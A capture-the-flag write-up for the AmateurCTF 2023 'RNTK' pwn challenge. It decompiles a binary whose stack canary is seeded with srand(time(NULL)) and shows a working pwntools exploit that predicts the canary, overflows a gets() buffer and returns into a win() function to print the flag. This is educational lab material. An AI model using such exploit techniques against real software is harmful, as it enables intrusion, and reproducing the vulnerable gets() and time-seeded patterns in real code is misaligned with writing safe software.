---
title: AmateurCTF '23 - Pwn - RNTK
date: '2023-07-18'
tags: ['ctf', 'pwn', 'amateurctf', 'amateurctf23', 'writeup', 'rntk', 'random-number', 'canary']
draft: false
summary: Exploiting srand(time(NULL)) to match the generated canary and then overflowing a buffer by generating another random number.
---

## Challenge Description

check out my random number toolkit!

Author: voxal

Connection info: `nc amt.rs 31175`

## Solution

We were provided with a simple Dockerfile, and a `chal` binary file

```docker:Dockerfile
FROM pwn.red/jail

COPY --from=ubuntu:22.04 / /srv

COPY chal /srv/app/run
COPY flag.txt /srv/app/flag.txt

RUN chmod 755 /srv/app/run
```

Let's use `checksec` to see what protections are enabled

![chal](/static/writeups/amateurctf2023/pwn/rntk-0.png)

Only `NX` is enabled. Let's try and decompile this binary using `Ghidra`. We can see the following functions

![chal](/static/writeups/amateurctf2023/pwn/rntk-1.png)

Let's firstly analyze the main function

> *NOTE* : I have changed the variables inside the functions to make sense for me. These aren't the actual variable names that ghidra provided.

```c:main
void main(void) {
  int randomNumber;
  int choice;
  
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  generate_canary();
  while( true ) {
    puts("Please select one of the following actions");
    puts("1) Generate random number");
    puts("2) Try to guess a random number");
    puts("3) Exit");
    choice = 0;
    __isoc99_scanf("%d",&choice);
    getchar();
    if (choice == 3) break;
    if (choice < 4) {
      if (choice == 1) {
        randomNumber = rand();
        printf("%d\n",(ulong)(uint)randomNumber);
      }
      else if (choice == 2) {
        random_guess();
      }
    }
  }
  exit(0);
}
```

Okay, we can see that the code is fairly simple. It's firstly calling the `generate_canary` function. Then asking for user input. If the user input is `3`, then the program exits. If the user input is `1`, then the program generates a random number and prints it. If the user input is `2`, then the program calls the `random_guess` function.

Let's look into the `generate_canary` function

```c:generate_canary
void generate_canary(void) {
  time_t t;
  t = time((time_t *)0x0);
  srand((uint)t);
  global_canary = rand();
  return;
}
```

This function is simply setting the `time(NULL)` to the variable `t` and the seeding the random function. Then it's setting the global variable `global_canary` to the random number generated by the `rand()` function.

I'm going to explain this in a bit more detail why this piece of code allows us to correctly guess the random number that is being generated. Now, according to the `srand` man page:

> The srand() function sets its argument as the seed for a new sequence of pseudo-random  integers  to  be  returned  by  rand(). These sequences are repeatable by calling srand() with the same seed value.

Now, focusing on the last line, we can see that if the provided `seed` is a same value, we'll get the same set of random numbers. Now, we can see that `time_t` which is set to `NULL` is being passed into the variable. This allows the variable to be set to the current EPOCH time. Which; if we run our exploit at the same time, we can guess the number.

Luckily, to check if we're generating a correct random number, they binary has provided us with an option. If we provide the `input` to be `1`, we can simply check if the number we guessed is correct or not.

Before moving forward, we have two more functions we need to look at, let's firstly look at `win` function. Judging by the name, we can see that this function will simply load the flag and print it.

```c:win
void win(void) {
  char local_58 [72];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("flag file not found");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(local_58,0x40,local_10);
  puts(local_58);
  return;
}
```

Now, let's look at the `random_guess` function

```c:random_guess
void random_guess(void) {
  int rnd;
  long strL;
  char buffer [40];
  int iStrL;
  int localCanary;
  
  printf("Enter in a number as your guess: ");
  localCanary = global_canary;
  gets(buffer);
  strL = strtol(buffer,(char **)0x0,10);
  iStrL = (int)strL;
  if (localCanary != global_canary) {
    puts("***** Stack Smashing Detected ***** : Canary Value Corrupt!");
    exit(1);
  }
  rnd = rand();
  if (iStrL == rnd) {
    puts("Congrats you guessed correctly!");
  }
  else {
    puts("Better luck next time");
  }
  return;
}
```

Okay, so let's firstly analyze this function. We can see that it's firstly setting the global variable `localCanary` to the global variable `global_canary`. Then it's asking for user input. Then it's converting the user input to a long integer using `strtol`. Then it's converting the long integer to an integer. Then it's checking if the `localCanary` is equal to the `global_canary`. If it's not, then it's printing `***** Stack Smashing Detected ***** : Canary Value Corrupt!` and exiting. If it is, then it's generating a random number and checking if the user input is equal to the random number. If it is, then it's printing `Congrats you guessed correctly!`. If it's not, then it's printing `Better luck next time`. Okay, let's see what we have to do now

- We have to guess the `global_canary` value
- We have to guess the `random` value
- We have to overflow the buffer to get to the `win` function
- To overflow the buffer, we need to ensure:
- The first four bytes are the number we want to guess
- The next `40` bytes are the junk-payload
- The next `4` bytes are the `localCanary` value
- The next `8` bytes are the junk values
- The last `8` bytes will contain the address to the `win` function

> I'll be explaining how we got these bytes offsets.

Okay, first thing first. Let's try and create a simple generate function that will actually allow us to guess the random numbers being generated by our program. For that, we'll use the following code

```py
from pwn import *
from ctypes import *

libc = cdll.LoadLibrary('/usr/lib/x86_64-linux-gnu/libc.so')
_time = libc.time(0x0)
libc.srand(_time)

guess = libc.rand()
```

This will allow us to generate a random number. Now, let's try and connect to the local binary, send `1` as input and then match if our script and the number provided match.

```py
from pwn import *
from ctypes import *


# Setting the binary context:
elf = context.binary = ELF('./chal')
io  = process()

libc = cdll.LoadLibrary(elf.libc.path)
_time = libc.time(0x0)
libc.srand(_time)

guess = libc.rand()

io.sendlineafter(b'Exit\n', b'1')
random = io.recvuntil(b'\n')[:-1].decode()

info(f"We guessed       : {guess}")
info(f"Program generated: {random}")
```

![chal](/static/writeups/amateurctf2023/pwn/rntk-2.png)

Now, we have successfully generated the random number. Now, we need to understand how we're going to overflow the buffer. Looking at these two lines of code:

```c
gets(buffer);
strL = strtol(buffer,(char **)0x0,10);
```

The first line, uses `gets` function, which is a vulnerable function. However, the next line uses `strol` which basically converts a string to long. 

```c
rnd = rand();
if (iStrL == rnd)
```

So, the `rnd` will generate a random number and then compare to the return value of `strol`. The `strol` function is

> The  strtol()  function converts the initial part of the string in nptr to a long integer value according to the given base, which must be between 2 and 36 inclusive,  or  be  the special value 0.

Now, this will convert all the input before a `space` is received and convert that to long. So, we know that we need this to be equal to our `guess` variable.
Next, we need to identify the offset where the buffer will overflow and overwrite the value of `localCanary`. To do that, we'll be using GDB ([pwndbg](https://github.com/pwndbg/pwndbg))

We'll be using `cyclic` and also setting up breakpoint at the `random_guess` function. Now, looking at the disassembly, we can see that the `localCanary` variable is being set at `rbp-0x4`. So, we'll be using `cyclic` to generate a pattern and then using `cyclic -l` to find the offset.

![chal](/static/writeups/amateurctf2023/pwn/rntk-3.png)
![chal](/static/writeups/amateurctf2023/pwn/rntk-4.png)

Now, we can see that we've found the offset i.e. `44`. So, the payload crafting now will be somthing like:

```md
1. The first four bytes are the number we want to guess
2. The next `40` bytes are the junk-payload (0th will be a space)
3. The next `4` bytes are the `localCanary` value
4. The next we'll add a cyclic pattern to find the offset
NOTE: As I've already told you, in 64bit, we can guess that the offset will be SIZE + 16 i.e. 40 + 16 = 56. So, after 56 bytes, if we write the address of our `win` function, we can get the flag.
```

> I created a local flag.txt with `TEST:FLAG` as the content to test the payload.

Now, the payload; with knowing that `56` bytes is the offset, and adding the win function will look something like this:

```py
#!/usr/bin/python3
from pwn import *
from ctypes import *

elf = context.binary = ELF("./chal")
io = process()

libc = cdll.LoadLibrary(elf.libc.path)
_time = libc.time(0x0)
libc.srand(_time)

offset = 44
io.sendlineafter(b"Exit\n", b'2')
canary = libc.rand()
guess  = libc.rand()
__init  = f"{guess} AAAA".encode()
payload = __init + b"\x90" * (offset - len(__init)) + canary.to_bytes(4, 'little') + (b"A" * 8) + p64(elf.sym.win)
io.sendlineafter(b"guess: ", payload)
info(io.recv())
```

![chal](/static/writeups/amateurctf2023/pwn/rntk-5.png)

Now, we can see that we've successfully exploited the binary and got the flag. Let's try this on the remote server.

![chal](/static/writeups/amateurctf2023/pwn/rntk-6.png)

Flag: `amateursCTF{r4nd0m_n0t_s0_r4nd0m_after_all}`